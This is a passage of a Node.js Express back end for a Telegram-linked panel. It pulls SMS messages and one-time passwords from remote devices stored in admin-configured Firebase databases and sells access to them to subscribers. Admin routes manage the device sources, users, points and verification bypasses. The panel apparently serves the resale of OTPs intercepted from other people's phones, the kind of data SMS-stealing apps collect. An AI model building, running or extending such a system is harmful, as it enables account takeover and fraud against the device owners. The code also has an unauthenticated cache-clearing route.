                phoneFromSms: extractFirstPhoneFromSms(messageText)
            };
        });

        const deviceStatus = matchedDevice && (matchedDevice.online === false || String(matchedDevice.status || '').toLowerCase() === 'offline') ? 'Offline' : 'Online';
        res.json({
            ok: true,
            otps,
            totalSms: smsList.length,
            serverId: selectedServer.serverId,
            serverName: selectedServer.serverName || '',
            status: deviceStatus,
            fallbackNumber,
            fallbackLabel: null,
            sims: displaySims,
            deviceId: matchedDevice ? matchedDevice.device_id : (targetDeviceId || null),
            realTime: true
        });
    } catch (err) {
        console.error('[API] OTP fetch error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error. Please try again.' });
    }
});

// ==================== REFRESH TOKEN ====================
router.post('/api/refresh', authMiddleware, async (req, res) => {
    try {
        const newCsrf = generateCsrf();
        const newToken = generateToken(req.user.userId, newCsrf, config.TOKEN_SECRET, config.SESSION_TTL_MS);
        res.json({ ok: true, token: newToken, csrf: newCsrf });
    } catch (err) {
        console.error('[API] Refresh error:', err.message);
        res.status(500).json({ ok: false, message: 'Refresh failed' });
    }
});

// ==================== HEALTH ====================
router.get('/api/health', async (req, res) => {
    const cacheHealth = await cache.health();
    res.json({
        ok: true,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        mongoState: mongoose.connection.readyState,
        autoFetch: getRuntimeOptions().autoFetch,
        cacheRefreshing: cache.recentCacheRefreshing,
        cacheHealth: cacheHealth,
        cacheSizes: {
            '2min': cache.memory.recentCache['2'].size,
            '10min': cache.memory.recentCache['10'].size,
            '30min': cache.memory.recentCache['30'].size,
            '60min': cache.memory.recentCache['60'].size,
            'older': cache.memory.recentCache['older'].size,
            'smsNotifications': cache.getSmsNotificationStats()
        }
    });
});

// ==================== CLEAR CACHE ====================
router.get('/clear-cache', async (req, res) => {
    try {
        const tier = req.query.tier;
        const validTiers = ['2', '10', '30', '60', 'older'];
        if (tier === 'smsNotifications' || tier === 'notifications') {
            cache.clearSmsNotifications();
            return res.json({ ok: true, message: 'SMS notification cache cleared successfully' });
        }

        if (!tier) {
            return res.status(400).json({
                ok: false,
                message: 'tier parameter required. Use ?tier=2, ?tier=10, ?tier=30, ?tier=60, ?tier=older, ?tier=smsNotifications, or ?tier=all'
            });
        }

        if (tier === 'all') {
            const beforeSizes = {
                '2': cache.memory.recentCache['2'].size,
                '10': cache.memory.recentCache['10'].size,
                '30': cache.memory.recentCache['30'].size,
                '60': cache.memory.recentCache['60'].size,
                'older': cache.memory.recentCache['older'].size
            };
            cache.clearAll();
            return res.json({
                ok: true,
                message: 'All cache tiers cleared successfully',
                cleared: beforeSizes
            });
        }

        if (!validTiers.includes(tier)) {
            return res.status(400).json({
                ok: false,
                message: 'Invalid tier. Allowed values: 2, 10, 30, 60, older, all'
            });
        }

        const clearedCount = cache.memory.recentCache[tier].size;
        cache.clearTier(tier);

        res.json({
            ok: true,
            message: `Cache tier '${tier}' cleared successfully`,
            clearedCount,
            remaining: {
                '2': cache.memory.recentCache['2'].size,
                '10': cache.memory.recentCache['10'].size,
                '30': cache.memory.recentCache['30'].size,
                '60': cache.memory.recentCache['60'].size,
                'older': cache.memory.recentCache['older'].size
            }
        });
    } catch (err) {
        console.error('[API] Clear cache error:', err.message);
        res.status(500).json({ ok: false, message: 'Server error' });
    }
});




// ==================== WORKER-STYLE ADMIN API ====================
function adminUserFromRequest(req) {
    const user = req.user;
    const isAdmin = Boolean(user && (String(user.userId) === String(config.ROOT_OWNER_ID) || user._isAdmin));
    return isAdmin ? user : null;
}
async function requirePanelAdmin(req, res, next) {
    try {
        if (!req.user) return res.status(401).json({ ok: false, message: 'Authentication required' });
        const botConfig = (await getCachedDbInfo()).config || {};
        const isAdmin = String(req.user.userId) === String(config.ROOT_OWNER_ID) || (botConfig.admins || []).map(String).includes(String(req.user.userId));
        if (!isAdmin) return res.status(403).json({ ok: false, message: 'Admin access required' });
        req.adminConfig = botConfig; req.isPanelAdmin = true; next();
    } catch (error) { return res.status(500).json({ ok: false, message: 'Unable to verify admin access' }); }
}
function boolValue(value, fallback = false) {
    if (value === undefined || value === null || value === '') return fallback;
    if (typeof value === 'boolean') return value;
    return ['1', 'true', 'yes', 'on'].includes(String(value).toLowerCase());
}
function numericValue(value, fallback, min = 0, max = Number.MAX_SAFE_INTEGER) {
    const n = Number(value); return Number.isFinite(n) ? Math.min(max, Math.max(min, n)) : fallback;
}
function publicServer(server) {
    if (!server) return null;
    return {
        serverId: server.serverId, serverName: server.serverName, serverKey: server.serverKey,
        numberFetchUrl: server.numberFetchUrl || '', otpFetchUrl: server.otpFetchUrl || '',
        firebaseDbId: server.firebaseDbId || '', userPath: server.userPath || 'clients',
        smsPath: server.smsPath || 'messages', listPath: server.listPath || 'clients',
        authKey: server.authKey || '', ownPaths: Boolean(server.ownPaths), htmlFormat: server.htmlFormat || '',
        isFirebase: isFirebaseServer(server), createdAt: server.createdAt
    };
}
async function allocateServerId() {
    const last = await ServerConfig.findOne().sort({ serverId: -1 }).lean();
    return last ? Number(last.serverId) + 1 : 1;
}
function serverPayload(body, existing = {}) {
    const source = body || {};
    return {
        serverName: String(source.serverName ?? source.name ?? existing.serverName ?? '').trim(),
        numberFetchUrl: String(source.numberFetchUrl ?? source.number_fetch_url ?? existing.numberFetchUrl ?? '').trim(),
        otpFetchUrl: String(source.otpFetchUrl ?? source.otp_fetch_url ?? existing.otpFetchUrl ?? '').trim(),
        firebaseDbId: String(source.firebaseDbId ?? source.firebase_db_id ?? existing.firebaseDbId ?? '').trim(),
        userPath: String(source.userPath ?? source.user_path ?? existing.userPath ?? 'clients').trim(),
        smsPath: String(source.smsPath ?? source.sms_path ?? existing.smsPath ?? 'messages').trim(),
        listPath: String(source.listPath ?? source.list_path ?? existing.listPath ?? 'clients').trim(),
        authKey: String(source.authKey ?? source.auth_key ?? existing.authKey ?? '').trim(),
        ownPaths: source.ownPaths !== undefined || source.own_paths !== undefined ? boolValue(source.ownPaths ?? source.own_paths) : Boolean(existing.ownPaths),
        htmlFormat: String(source.htmlFormat ?? source.html_format ?? existing.htmlFormat ?? '').trim().toLowerCase()
    };
}
function validateServerPayload(payload) {
    if (!payload.serverName) return 'Server name is required';
    if (!payload.firebaseDbId && !payload.numberFetchUrl) return 'Provide Firebase database ID or number fetch URL';
    if (payload.htmlFormat && !['falcon', 'legacy'].includes(payload.htmlFormat)) return 'Format must be falcon, legacy, or blank for auto-discovery';
    return null;
}
// Firebase sources may share a database when they read different branches.
// A duplicate is therefore the same Firebase DB ID with the same userPath and smsPath.
function normalizeServerPath(value, fallback) {
    return String(value || fallback || '').trim().replace(/^\/+|\/+$/g, '').toLowerCase();
}
function firebaseSourceKey(source) {
    if (!source || !source.firebaseDbId) return '';
    return [
        String(source.firebaseDbId).trim().toLowerCase(),
        normalizeServerPath(source.userPath, 'clients'),
        normalizeServerPath(source.smsPath, 'messages')
    ].join('|');
}
function duplicateFirebaseMessage(payload) {
    return `Firebase DB ID already exists for user path "${payload.userPath || 'clients'}" and SMS path "${payload.smsPath || 'messages'}"`;
}
async function findDuplicateFirebaseServer(payload, excludeId) {
    if (!payload || !payload.firebaseDbId) return null;
    const query = { firebaseDbId: payload.firebaseDbId };
    if (excludeId) query._id = { $ne: excludeId };
    const matches = await ServerConfig.find(query).select('firebaseDbId userPath smsPath').lean();
    const key = firebaseSourceKey(payload);
    return matches.find(server => firebaseSourceKey(server) === key) || null;
}
function invalidateAdminCaches() { clearAllApplicationCaches(); }

router.get('/api/admin/me', authMiddleware, requirePanelAdmin, async (req, res) => {
    res.json({ ok: true, admin: true, userId: req.user.userId, config: req.adminConfig });
});
router.get('/api/admin/overview', authMiddleware, requirePanelAdmin, async (req, res) => {
    // FIX: Serve from admin cache to avoid repeated DB hits
    const cached = cache.getAdminOverview();
    if (cached) return res.json(cached);

    const { servers, config: botConfig } = await getCachedDbInfo();
    // Never block the admin UI on slow or unreachable upstream number sources.
    // The background cache worker will populate counts and the next refresh will show them.
    const counts = (await cache.getServerCounts()) || servers.map(s => ({
        serverId: s.serverId, serverName: s.serverName, serverKey: s.serverKey,
        count: 0, online: 0, offline: 0, firebase: isFirebaseServer(s), loading: true
    }));
    const users = await User.countDocuments();
    const activeUsers = await User.countDocuments({ lastActive: { $gte: new Date(Date.now() - 24 * 60 * 60 * 1000) } });
    const subscribedUsers = await User.countDocuments({ subscriptionExpires: { $gt: new Date() }, isBanned: false });
    const result = { ok: true, stats: { totalServers: servers.length, totalNumbers: counts.reduce((a, x) => a + Number(x.count || 0), 0), totalUsers: users, activeUsers, subscribedUsers, onlineNumbers: counts.reduce((a, x) => a + Number(x.online || 0), 0) }, serverCounts: counts, cache: cache.getStats(), config: botConfig, runtime: getRuntimeOptions() };
    cache.setAdminOverview(result);
    res.json(result);
});
router.get('/api/admin/servers', authMiddleware, requirePanelAdmin, async (req, res) => {
    // FIX: Use admin cache + getCachedDbInfo to avoid direct DB hit
    const cached = cache.getAdminServers();
    if (cached) return res.json(cached);

    const { servers } = await getCachedDbInfo();
    const result = { ok: true, servers: servers.map(publicServer) };
    cache.setAdminServers(result);
    res.json(result);
});
router.get('/api/admin/servers/:key', authMiddleware, requirePanelAdmin, async (req, res) => {
    const key = String(req.params.key);
    const server = await ServerConfig.findOne({ $or: [{ serverKey: key }, { serverId: Number(key) || -1 }] }).lean();
    if (!server) return res.status(404).json({ ok: false, message: 'Server not found' });
    res.json({ ok: true, server: publicServer(server) });
});
router.post('/api/admin/servers', authMiddleware, requirePanelAdmin, async (req, res) => {
    const payload = serverPayload(req.body);
    const error = validateServerPayload(payload);
    if (error) return res.status(400).json({ ok: false, message: error });
    if (await findDuplicateFirebaseServer(payload)) return res.status(400).json({ ok: false, message: duplicateFirebaseMessage(payload), code: 'FIREBASE_SOURCE_EXISTS' });
    const serverId = await allocateServerId();
    if (!payload.serverName) payload.serverName = `Server ${serverId}`;
    const server = await ServerConfig.create({ serverId, serverKey: `server_${serverId}`, ...payload });
    invalidateAdminCaches();
    res.json({ ok: true, message: 'Server added', server: publicServer(server.toObject()) });
});
router.post('/api/admin/servers/bulk', authMiddleware, requirePanelAdmin, async (req, res) => {
    const rows = Array.isArray(req.body?.servers) ? req.body.servers : [];
    if (!rows.length) return res.status(400).json({ ok: false, message: 'servers array required' });
    const existing = new Set((await ServerConfig.find().select('firebaseDbId userPath smsPath').lean()).map(firebaseSourceKey).filter(Boolean));
    const incoming = new Set(); const created = []; let skipped = 0; let skipReasons = [];
    let next = await allocateServerId();
    for (const row of rows) {
        const payload = serverPayload(row); 
        // FIX: Auto-assign name before validation
        if (!payload.serverName) payload.serverName = `Server ${next}`;
        const error = validateServerPayload(payload);
        if (error) { skipped++; skipReasons.push(`Row ${next}: ${error}`); continue; }
        const sourceKey = firebaseSourceKey(payload);
        if (sourceKey && (existing.has(sourceKey) || incoming.has(sourceKey))) { 
            skipped++; skipReasons.push(`Row ${next}: ${duplicateFirebaseMessage(payload)}`); 
            continue; 
        }
        if (sourceKey) incoming.add(sourceKey); 
        created.push({ serverId: next, serverKey: `server_${next}`, ...payload }); 
        next++;
    }
    if (created.length) await ServerConfig.insertMany(created);
    invalidateAdminCaches(); 
    // FIX: Proper response when nothing added
    if (created.length === 0) {
        return res.status(400).json({ ok: false, message: `No servers added. ${skipped} skipped. Reasons: ${skipReasons.slice(0, 3).join('; ')}`, added: 0, skipped, skipReasons });
    }
    res.json({ ok: true, message: `${created.length} servers added, ${skipped} skipped`, added: created.length, skipped });
});
router.put('/api/admin/servers/:key', authMiddleware, requirePanelAdmin, async (req, res) => {
    const key = String(req.params.key); const existing = await ServerConfig.findOne({ $or: [{ serverKey: key }, { serverId: Number(key) || -1 }] });
    if (!existing) return res.status(404).json({ ok: false, message: 'Server not found' });
    const payload = serverPayload(req.body, existing.toObject()); const error = validateServerPayload(payload);
    if (error) return res.status(400).json({ ok: false, message: error });
    if (await findDuplicateFirebaseServer(payload, existing._id)) return res.status(400).json({ ok: false, message: duplicateFirebaseMessage(payload), code: 'FIREBASE_SOURCE_EXISTS' });
    Object.assign(existing, payload); await existing.save(); invalidateAdminCaches(); res.json({ ok: true, message: 'Server updated', server: publicServer(existing.toObject()) });
});
async function renumberServers() {
    const all = await ServerConfig.find().sort({ serverId: 1 });
    for (let i = 0; i < all.length; i++) { 
        all[i].serverId = i + 1; 
        all[i].serverKey = `server_${i + 1}`; 
        all[i].serverName = `Server ${i + 1}`; 
        await all[i].save(); 
    }
}
router.delete('/api/admin/servers/:key', authMiddleware, requirePanelAdmin, async (req, res) => {
    const key = String(req.params.key); const existing = await ServerConfig.findOne({ $or: [{ serverKey: key }, { serverId: Number(key) || -1 }] });
    if (!existing) return res.status(404).json({ ok: false, message: 'Server not found' });
    await existing.deleteOne(); await renumberServers(); invalidateAdminCaches(); res.json({ ok: true, message: 'Server deleted and list renumbered' });
});
router.post('/api/admin/servers/bulk-delete', authMiddleware, requirePanelAdmin, async (req, res) => {
    const keys = Array.isArray(req.body?.keys) ? req.body.keys.map(String) : [];
    if (!keys.length) return res.status(400).json({ ok: false, message: 'keys array required' });
    const ids = keys.map(k => Number(k)).filter(Number.isFinite);
    await ServerConfig.deleteMany({ $or: [{ serverKey: { $in: keys } }, ...(ids.length ? [{ serverId: { $in: ids } }] : [])] });
    await renumberServers(); invalidateAdminCaches(); res.json({ ok: true, message: `${keys.length} servers deleted and list renumbered` });
});
router.post('/api/admin/servers/bulk-edit', authMiddleware, requirePanelAdmin, async (req, res) => {
    const keys = Array.isArray(req.body?.keys) ? req.body.keys.map(String) : []; const updates = req.body?.updates || {};
    if (!keys.length) return res.status(400).json({ ok: false, message: 'keys array required' });
    const allowed = ['serverName', 'numberFetchUrl', 'otpFetchUrl', 'firebaseDbId', 'userPath', 'smsPath', 'listPath', 'authKey', 'ownPaths', 'htmlFormat'];
    const clean = {}; for (const field of allowed) if (updates[field] !== undefined) clean[field] = updates[field];
    const ids = keys.map(k => Number(k)).filter(Number.isFinite);
    await ServerConfig.updateMany({ $or: [{ serverKey: { $in: keys } }, ...(ids.length ? [{ serverId: { $in: ids } }] : [])] }, { $set: clean });
    invalidateAdminCaches(); res.json({ ok: true, message: `${keys.length} servers updated` });
});
router.get('/api/admin/users', authMiddleware, requirePanelAdmin, async (req, res) => {
    const limit = Math.min(200, Math.max(1, Number(req.query.limit) || 100));
    const query = String(req.query.search || '').trim();
    // User data is intentionally real-time; never serve it from admin cache.

    const filter = query ? { $or: [{ userId: new RegExp(query, 'i') }, { username: new RegExp(query.replace(/^@/, ''), 'i') }, { firstName: new RegExp(query, 'i') }, { lastName: new RegExp(query, 'i') }] } : {};
    const [users, total] = await Promise.all([User.find(filter).sort({ lastActive: -1 }).limit(limit).lean(), User.countDocuments(filter)]);
    const result = { ok: true, users: users.map(u => ({ userId: u.userId, username: u.username, firstName: u.firstName, lastName: u.lastName, points: u.points, totalReferrals: u.totalReferrals, subscriptionExpires: u.subscriptionExpires, isBanned: u.isBanned, isDeviceVerified: u.isDeviceVerified, verificationBypassed: u.verificationBypassed, joinedAt: u.joinedAt, lastActive: u.lastActive })), total, query };
    res.json(result);
});
router.get('/api/admin/users/:userId', authMiddleware, requirePanelAdmin, async (req, res) => {
    const user = await User.findOne({ userId: String(req.params.userId) }).lean();
    if (!user) return res.status(404).json({ ok: false, message: 'User not found' });
    res.json({ ok: true, user: { userId: user.userId, username: user.username, firstName: user.firstName, lastName: user.lastName, points: user.points, subscriptionExpires: user.subscriptionExpires, isBanned: user.isBanned, isDeviceVerified: user.isDeviceVerified, verificationBypassed: user.verificationBypassed, totalReferrals: user.totalReferrals, joinedAt: user.joinedAt, lastActive: user.lastActive } });
});
router.patch('/api/admin/users/:userId', authMiddleware, requirePanelAdmin, async (req, res) => {
    const body = req.body || {};
    const targetUserId = String(req.params.userId);
    const adminUserId = String(req.user.userId);
    const update = {};

    // PROTECTION: Root owner cannot be banned or modified
    if (targetUserId === String(config.ROOT_OWNER_ID)) {
        if (body.isBanned !== undefined || body.verificationBypassed !== undefined || body.points !== undefined) {
            return res.status(403).json({ ok: false, message: 'Root owner account cannot be modified' });
        }
    }

    // PROTECTION: Admin cannot ban themselves
    if (targetUserId === adminUserId && body.isBanned === true) {
        return res.status(403).json({ ok: false, message: 'You cannot ban yourself' });
    }

    if (body.points !== undefined) update.points = numericValue(body.points, 0, 0, 1000000000);
    if (body.subscriptionExpires !== undefined) update.subscriptionExpires = body.subscriptionExpires ? new Date(body.subscriptionExpires) : null;
    if (body.isBanned !== undefined) update.isBanned = boolValue(body.isBanned);
    if (body.verificationBypassed !== undefined) update.verificationBypassed = boolValue(body.verificationBypassed);
    if (!Object.keys(update).length) return res.status(400).json({ ok: false, message: 'No valid user fields supplied' });
    const user = await User.findOneAndUpdate({ userId: targetUserId }, { $set: update }, { new: true }).lean();
    if (!user) return res.status(404).json({ ok: false, message: 'User not found' });
    res.json({ ok: true, message: 'User updated', user: { userId: user.userId, isBanned: user.isBanned, points: user.points, subscriptionExpires: user.subscriptionExpires, verificationBypassed: user.verificationBypassed } });
});
router.get('/api/admin/settings', authMiddleware, requirePanelAdmin, async (req, res) => {
    const now = Date.now();
    if (cache.memory.adminCache.settings && (now - cache.memory.adminCache.settingsTs) < cache.ADMIN_TTL.settings) {
        return res.json(cache.memory.adminCache.settings);
    }
    const { config: botConfig } = await getCachedDbInfo();
    const result = { ok: true, settings: botConfig, runtime: getRuntimeOptions() };
    cache.memory.adminCache.settings = result;
    cache.memory.adminCache.settingsTs = now;
    res.json(result);
});
router.put('/api/admin/settings', authMiddleware, requirePanelAdmin, async (req, res) => {
    const body = req.body || {}; const allowed = ['isMaintenanceMode', 'referPoints', 'referredBonusPoints', 'subCost', 'subDurationHours', 'contactAdmin', 'admins', 'isDepositEnabled', 'minDepositAmount', 'qrImageUrl', 'paymentVerifyApiUrl', 'miniAppUrl', 'requireDeviceVerification', 'requiredChannels', 'autoFetch', 'smsLatestLimit', 'cacheRefreshIntervalMs', 'cacheTtlDashboard', 'cacheTtlServer', 'cacheTtlSms', 'rateDashboardWindow', 'rateDashboardMax', 'rateServerWindow', 'rateServerMax', 'rateSmsWindow', 'rateSmsMax', 'rateDevicesWindow', 'rateDevicesMax', 'rateOtpWindow', 'rateOtpMax', 'initDataExpiryHours'];
    const update = {};
    for (const key of allowed) if (body[key] !== undefined) update[key] = body[key];
    if (update.admins) update.admins = [...new Set(update.admins.map(String).filter(Boolean))];
    if (update.autoFetch !== undefined) update.autoFetch = boolValue(update.autoFetch);
    if (update.isMaintenanceMode !== undefined) update.isMaintenanceMode = boolValue(update.isMaintenanceMode);
    if (update.isDepositEnabled !== undefined) update.isDepositEnabled = boolValue(update.isDepositEnabled);
    if (update.requireDeviceVerification !== undefined) update.requireDeviceVerification = boolValue(update.requireDeviceVerification);
    if (update.smsLatestLimit !== undefined) update.smsLatestLimit = numericValue(update.smsLatestLimit, 10, 1, 100);
    if (update.cacheRefreshIntervalMs !== undefined) update.cacheRefreshIntervalMs = numericValue(update.cacheRefreshIntervalMs, config.CACHE_REFRESH_INTERVAL_MS, 15000, 86400000);
    if (update.cacheTtlDashboard !== undefined) update.cacheTtlDashboard = numericValue(update.cacheTtlDashboard, config.DASHBOARD_CACHE_TTL, 1000, 3600000);
    if (update.cacheTtlServer !== undefined) update.cacheTtlServer = numericValue(update.cacheTtlServer, config.SERVER_NUMBERS_TTL, 5000, 3600000);
    if (update.cacheTtlSms !== undefined) update.cacheTtlSms = numericValue(update.cacheTtlSms, 5000, 1000, 3600000);
    if (update.initDataExpiryHours !== undefined) update.initDataExpiryHours = numericValue(update.initDataExpiryHours, 1, 1, 168);
    for (const key of ['rateDashboardWindow', 'rateServerWindow', 'rateSmsWindow', 'rateDevicesWindow', 'rateOtpWindow']) if (update[key] !== undefined) update[key] = numericValue(update[key], 10000, 1000, 3600000);
    for (const key of ['rateDashboardMax', 'rateServerMax', 'rateSmsMax', 'rateDevicesMax', 'rateOtpMax']) if (update[key] !== undefined) update[key] = numericValue(update[key], 60, 1, 100000);
    const saved = await BotConfig.findOneAndUpdate({ key: 'main_config' }, { $set: update }, { new: true, upsert: true });
    invalidateAdminCaches();
    if (cache.memory.dbInfo) cache.memory.dbInfo.config = saved.toObject();
    if (update.autoFetch !== undefined) {
        cache.memory.dbInfo = { config: saved.toObject(), servers: await ServerConfig.find().sort({ serverId: 1 }).lean() };
        applyAutoFetchSetting(update.autoFetch);
    }
    res.json({ ok: true, message: 'Settings updated', settings: saved });
});
router.get('/api/admin/cache/stats', authMiddleware, requirePanelAdmin, async (req, res) => { res.json({ ok: true, stats: cache.getStats(), runtime: getRuntimeOptions(), health: await cache.health() }); });
router.post('/api/admin/cache/clear', authMiddleware, requirePanelAdmin, async (req, res) => { clearAllApplicationCaches(); res.json({ ok: true, message: 'All application caches cleared' }); });
router.post('/api/admin/security/replay-clear', authMiddleware, requirePanelAdmin, async (req, res) => {
    const [initDataResult, csrfResult] = await Promise.all([
        InitDataReplay.deleteMany({}),
        CsrfReplay.deleteMany({})
    ]);
    res.json({ ok: true, message: 'Security replay records cleared', deleted: { initData: initDataResult.deletedCount || 0, csrf: csrfResult.deletedCount || 0 } });
});
router.post('/api/admin/cache/refresh', authMiddleware, requirePanelAdmin, async (req, res) => { if (!getRuntimeOptions().autoFetch) return res.status(400).json({ ok: false, message: 'Auto fetch is disabled' }); await refreshRecentCache(); res.json({ ok: true, message: 'Cache refreshed', cache: cache.getStats() }); });
router.post('/api/admin/dashboard-test', authMiddleware, requirePanelAdmin, async (req, res) => {
    const key = String(req.body?.serverKey || req.body?.server_key || req.body?.serverId || '');
    const server = key ? await ServerConfig.findOne({ $or: [{ serverKey: key }, { serverId: Number(key) || -1 }] }).lean() : null;
    const candidates = server ? [server] : await ServerConfig.find().sort({ serverId: 1 }).lean();
    const results = [];
    for (const item of candidates) {
        const testItem = { ...item };
        for (const [field, aliases] of Object.entries({ firebaseDbId: ['firebaseDbId', 'firebase_db_id'], userPath: ['userPath', 'user_path'], smsPath: ['smsPath', 'sms_path'], listPath: ['listPath', 'list_path'], authKey: ['authKey', 'auth_key'], htmlFormat: ['htmlFormat', 'html_format'], ownPaths: ['ownPaths', 'own_paths'] })) {
            const provided = aliases.find(alias => req.body?.[alias] !== undefined);
            if (provided) testItem[field] = req.body[provided];
        }
        const started = Date.now();
        try { const snapshot = await fbGetSnapshot(testItem, numericValue(req.body?.smsLimit, 10, 1, 100)); results.push({ server: publicServer(testItem), success: true, responseTimeMs: Date.now() - started, devices: Object.keys(snapshot.devices).length, sms: snapshot.sms.length, sampleSms: snapshot.sms.slice(0, 3) }); }
        catch (e) { results.push({ server: publicServer(testItem), success: false, responseTimeMs: Date.now() - started, error: e.message }); }
    }
    res.json({ ok: true, results });
});

// ============================================================
// APP SETUP
// ============================================================
const app = express();
app.disable('x-powered-by');

app.use(function(req, res, next) {
    const isApiRequest = req.path.indexOf('/api/') === 0;
    const origin = String(req.headers.origin || '').trim().replace(/\/$/, '').toLowerCase();
    const allowed = isAllowedRequestOrigin(req);
    const requestHost = String(req.headers['x-forwarded-host'] || req.get('host') || '').split(',')[0].trim().toLowerCase();
    const sameHostGetWithoutOrigin = !origin && requestHost === PRIMARY_HOST && ['GET', 'HEAD'].includes(req.method);
    // API access without Origin is rejected, which blocks direct curl/server
    // scripts and cross-site requests that try to omit CORS metadata. A normal
    // same-origin browser GET may omit Origin, so it is allowed only on the
    // exact production host; IP/default-host GETs remain blocked.
    if (isApiRequest && !allowed && !sameHostGetWithoutOrigin) return res.status(403).json({ ok: false, message: 'Only https://devilcampaigns.dpdns.org is allowed' });
    if (req.method === 'OPTIONS') {
        if (!allowed) return res.status(403).json({ ok: false, message: 'CORS origin not allowed' });
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Auth-Token, X-CSRF-Token');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
        return res.sendStatus(204);
    }
    if (origin && allowed) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin');
    }
    next();
});
app.use(function(req, res, next) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://telegram.org https://*.telegram.org https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob: https:; connect-src 'self' https://*.firebaseio.com https://*.firebasedatabase.app https://challenges.cloudflare.com https://api.telegram.org; frame-src https://challenges.cloudflare.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'");
    if (process.env.NODE_ENV === 'production' && (req.secure || String(req.headers['x-forwarded-proto'] || '').split(',')[0] === 'https')) res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    if (req.path.indexOf('/api/') === 0) res.setHeader('Cache-Control', 'no-store');
    next();
});
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Root health check for Railway
app.get('/health', async (req, res) => {
    const cacheHealth = await cache.health();
    const mongoOk = mongoose.connection.readyState === 1;
    const runtime = getRuntimeOptions();
    res.json({ 
        ok: mongoOk, 
        status: mongoOk ? 'healthy' : 'degraded',
        uptime: process.uptime(), 
        timestamp: new Date().toISOString(),
        mongo: mongoOk ? 'connected' : 'disconnected',
        redis: cacheHealth.redis ? 'connected' : 'memory-only',
        cache: {
            ready: cache.recentCacheRefreshing === false,
            building: cache.recentCacheRefreshing,
            sizes: cache.getStats()
        },
        autoFetch: runtime.autoFetch,
        memory: process.memoryUsage()
    });
});

// Serve the dashboard at the root path. Health checks use /health.
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use('/', router);

app.get('*', (req, res) => {
    try {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    } catch (err) {
        console.error('[Static] File serve error:', err.message);
        res.status(500).send('Error loading page');
    }
});

app.use((err, req, res, next) => {
    console.error('[Express] Unhandled error:', err.message, err.stack);
    // FIX: Don't leak stack in production
    const isDev = process.env.NODE_ENV !== 'production';
    res.status(err.status || 500).json({ 
        ok: false, 
        message: err.message || 'Internal server error',
        ...(isDev && err.stack ? { stack: err.stack.split('\n').slice(0, 5) } : {})
    });
});

// ==================== DB CONNECT ====================
async function connectDB() {
    if (!config.MONGODB_URI) {
        console.error('[FATAL] MONGODB_URI is missing!');
        process.exit(1);
    }
    try {
        await mongoose.connect(config.MONGODB_URI, {
            serverSelectionTimeoutMS: 5000,
            socketTimeoutMS: 45000,
            maxPoolSize: 20,
            minPoolSize: 5,
            connectTimeoutMS: 10000,
        });
        console.log('[DB] MongoDB Connected (Pool: 20)');

        let botConfig = await BotConfig.findOne({ key: 'main_config' });
        if (!botConfig) {
            botConfig = new BotConfig({ key: 'main_config' });
            await botConfig.save();
            console.log('[DB] Default config created');
        }
    } catch (err) {
        console.error('[FATAL] DB Connection Error:', err.message);
        process.exit(1);
    }
}

// ==================== START SERVER ====================
async function startServer() {
    await connectDB();

    const PORT = process.env.PORT || config.PORT || 3001;
    const server = app.listen(PORT, '0.0.0.0', () => {
        console.log(`[Server] Panel running on port ${PORT} | AUTO_FETCH: ${getRuntimeOptions().autoFetch}`);
        console.log(`[Server] Server Concurrency: ${config.SERVER_CONCURRENCY} | Number Concurrency: ${config.NUMBER_CONCURRENCY}`);
        console.log(`[Server] Redis: ${cache.redisEnabled ? 'Connected' : 'Memory Only'}`);
        console.log(`[Server] Cache Tiers: 2min, 10min, 30min, 60min, older | SMS Notifications: latest 2min tier`);
    });

    if (getRuntimeOptions().autoFetch) {
        startRecentNumbersCache();
    }

    process.on('SIGTERM', () => gracefulShutdown(server, 'SIGTERM'));
    process.on('SIGINT', () => gracefulShutdown(server, 'SIGINT'));
}

function gracefulShutdown(server, signal) {
    console.log(`[Server] ${signal} received. Shutting down gracefully...`);
    stopRecentNumbersCache();
    server.close(() => {
        mongoose.connection.close(false, () => {
            process.exit(0);
        });
    });
}

if (require.main === module) {
    startServer();
}

module.exports = { app, config, cache, getRuntimeOptions, getServerNumbersFromSource, getSmsFromSource, fbMobile, fbDateValue, fbExtractSms, fbExtractDevices, fbSims, fbPhones, fbParseDevice, fbNumbersFromDevices };
